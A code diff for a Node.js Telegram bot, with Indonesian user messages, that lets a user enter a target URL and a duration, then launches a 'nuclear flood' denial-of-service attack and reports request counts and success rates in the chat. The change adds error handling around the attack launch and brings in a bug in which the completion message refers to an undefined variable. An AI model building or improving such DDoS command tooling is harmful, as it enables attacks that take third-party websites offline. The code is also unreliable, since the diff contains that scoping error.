@@ -116,24 +116,25 @@ bot.on('message', async (msg) => {
             return;
         }
 
-        const parts = text.split(' ');
+        try {
+            const parts = text.split(' ');
 
-        if (parts.length !== 2 || !parts[0].startsWith('http') || isNaN(parseInt(parts[1]))) {
-            bot.sendMessage(chatId, "❌ *Format salah!*\nMohon masukkan dengan benar, contoh: `https://example.com 300`", { parse_mode: 'Markdown' });
-            return;
-        }
+            if (parts.length !== 2 || !parts[0].startsWith('http') || isNaN(parseInt(parts[1]))) {
+                bot.sendMessage(chatId, "❌ *Format salah!*\nMohon masukkan dengan benar, contoh: `https://example.com 300`", { parse_mode: 'Markdown' });
+                return;
+            }
 
-        const url = parts[0];
-        const duration = parseInt(parts[1]);
+            const url = parts[0];
+            const duration = parseInt(parts[1]);
 
-        delete userState[chatId];
+            delete userState[chatId];
 
-        const sentMessage = await bot.sendMessage(chatId, "✅ *Perintah Diterima*\n\nMenyiapkan serangan...", { parse_mode: 'Markdown' });
-        const messageId = sentMessage.message_id;
+            const sentMessage = await bot.sendMessage(chatId, "✅ *Perintah Diterima*\n\nMenyiapkan serangan...", { parse_mode: 'Markdown' });
+            const messageId = sentMessage.message_id;
 
-        let lastMessageText = '';
-        const statusCallback = (stats) => {
-            const statusText = `
+            let lastMessageText = '';
+            const statusCallback = (stats) => {
+                const statusText = `
 ✅ *Serangan Gabungan Sedang Berjalan*
 
 *Target:* \`${url}\`
@@ -143,41 +144,56 @@ bot.on('message', async (msg) => {
 *Total Requests:* \`${stats.totalSent.toLocaleString()}\`
 *Total Error:* \`${stats.totalError.toLocaleString()}\`
 *Success Rate:* \`${stats.successRate} %\`
-            `;
+                `;
 
-            if (statusText !== lastMessageText) {
-                bot.editMessageText(statusText, {
+                if (statusText !== lastMessageText) {
+                    bot.editMessageText(statusText, {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        parse_mode: 'Markdown'
+                    }).catch(() => {}); // Ignore errors like "message is not modified"
+                    lastMessageText = statusText;
+                }
+            };
+
+            const attackControls = startNuclearFlood(url, duration, statusCallback);
+            
+            if (!attackControls || typeof attackControls.stop !== 'function') {
+                console.error("Fatal: startNuclearFlood tidak mengembalikan kontrol serangan yang valid.");
+                await bot.editMessageText("❌ Gagal memulai serangan. Proses utama tidak merespons. Silakan periksa log server.", {
                     chat_id: chatId,
                     message_id: messageId,
-                    parse_mode: 'Markdown'
-                }).catch(() => {}); // Ignore errors like "message is not modified"
-                lastMessageText = statusText;
+                });
+                delete userState[chatId]; // Reset state
+                return;
             }
-        };
 
-        const attackControls = startNuclearFlood(url, duration, statusCallback);
-        
-        const finishTimeout = setTimeout(() => {
-            const finalText = `
+            const finishTimeout = setTimeout(() => {
+                const finalText = `
 🛑 *Serangan Selesai*
 
 *Target:* \`${url}\`
 *Durasi Total:* \`${duration} detik\`
-            `;
-            bot.editMessageText(finalText, {
-                chat_id: chatId,
-                message_id: messageId,
-                parse_mode: 'Markdown'
-            }).catch(() => {});
-            currentAttack = null;
-        }, (duration + 1) * 1000);
+                `;
+                bot.editMessageText(statusText, {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown'
+                }).catch(() => {});
+                currentAttack = null;
+            }, (duration + 1) * 1000);
 
-        currentAttack = {
-            stop: attackControls.stop,
-            finishTimeout: finishTimeout,
-            messageId: messageId,
-            chatId: chatId,
-            url: url
-        };
+            currentAttack = {
+                stop: attackControls.stop,
+                finishTimeout: finishTimeout,
+                messageId: messageId,
+                chatId: chatId,
+                url: url
+            };
+        } catch (error) {
+            console.error("Error fatal saat persiapan serangan:", error);
+            bot.sendMessage(chatId, `❌ Terjadi error yang tidak terduga: ${error.message}. Silakan periksa log.`);
+            delete userState[chatId]; // Reset state
+        }
     }
 });
